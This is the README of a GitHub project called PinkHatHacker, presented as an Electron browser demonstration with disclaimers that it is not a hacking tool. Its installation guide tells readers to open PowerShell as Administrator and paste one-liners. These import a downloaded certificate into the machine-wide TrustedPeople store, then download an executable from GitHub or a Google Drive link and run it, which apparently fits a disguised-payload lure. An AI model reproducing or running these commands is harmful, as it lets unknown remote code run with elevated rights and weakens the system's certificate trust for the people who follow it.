<p align="center">
  <img src="https://github.com/user-attachments/assets/7a27e1a7-a34a-4b1e-acfc-da61a4ffd1b9" alt="PinkHatHacker" width="180">
</p>

<h1 align="center">PinkHatHacker</h1>

<p align="center">
  <img src="https://img.shields.io/badge/version-1.0.2-blue.svg" alt="Version"> <img src="https://img.shields.io/badge/platform-Windows-lightgrey.svg" alt="Platform"> <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License"> <img src="https://img.shields.io/badge/Electron-30.0.0-47848F?logo=electron&logoColor=white" alt="Electron">
</p>

<p align="center">
  A desktop browser demonstration project.
</p>

---

## About

**PinkHatHacker** is a demonstration project built to explore how a Chromium-based desktop application can be packaged and configured as a controlled browsing environment.

The project is intended for educational and technical demonstration purposes. It explores application behavior, browser integration, desktop packaging, and controlled web navigation within an Electron-based application.

This project is **not a hacking tool**, penetration-testing framework, security-testing utility, or offensive security product.

It does not promote or encourage unauthorized access, exploitation, or other harmful activity.

---

<br><br><br>

## 📥 Direct Downloads (GitHub Releases)

You can download the compiled assets directly from the [v1.0.2 Release](https://github.com/show-now/pinkhathacker/releases/tag/v1.0.2):

* 📦 **[PinkHatHacker.v1.0.2.exe](https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe)** — Standalone Executable Installer
* 📁 **[Source Code (v1.0.2.zip)](https://github.com/show-now/pinkhathacker/archive/refs/tags/v1.0.2.zip)** — Complete Source Code Archive

---

<br><br><br>

## 🚀 PowerShell Installation Guide

> **Note:** Open **PowerShell as Administrator** before running any of the following commands.

### Option 1: Automated All-in-One Installation (Recommended)

#### A. Install Certificate & App via GitHub
```powershell
powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\LocalMachine\TrustedPeople'; Invoke-WebRequest -Uri '[https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe](https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"

```

#### B. Install Certificate & App via Google Drive

```powershell
powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\LocalMachine\TrustedPeople'; Invoke-WebRequest -Uri '[https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o](https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"

```

---

<br><br><br>

### Option 2: Step-by-Step / Separate Installation

#### Step 1: Install Certificate Only

```powershell
powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\LocalMachine\TrustedPeople'"

```

#### Step 2: Download Executable or Source Code Separately

* **Download & Run Executable (`.exe`) via GitHub:**
```powershell
powershell -Command "Invoke-WebRequest -Uri '[https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe](https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"

```

* **Download Executable (`.exe`) via Google Drive:**
```powershell
powershell -Command "Invoke-WebRequest -Uri '[https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o](https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"

```

<br><br><br>

---

## Disclaimer

PinkHatHacker is provided for educational and demonstration purposes.

The project does not promote hacking, unauthorized access, exploitation, credential theft, malware development, or bypassing security controls.

Users are responsible for ensuring that their use of the project complies with applicable laws, policies, and the permissions of the systems they interact with.

---

<br><br><br>

## License

See the `LICENSE` file for licensing information.
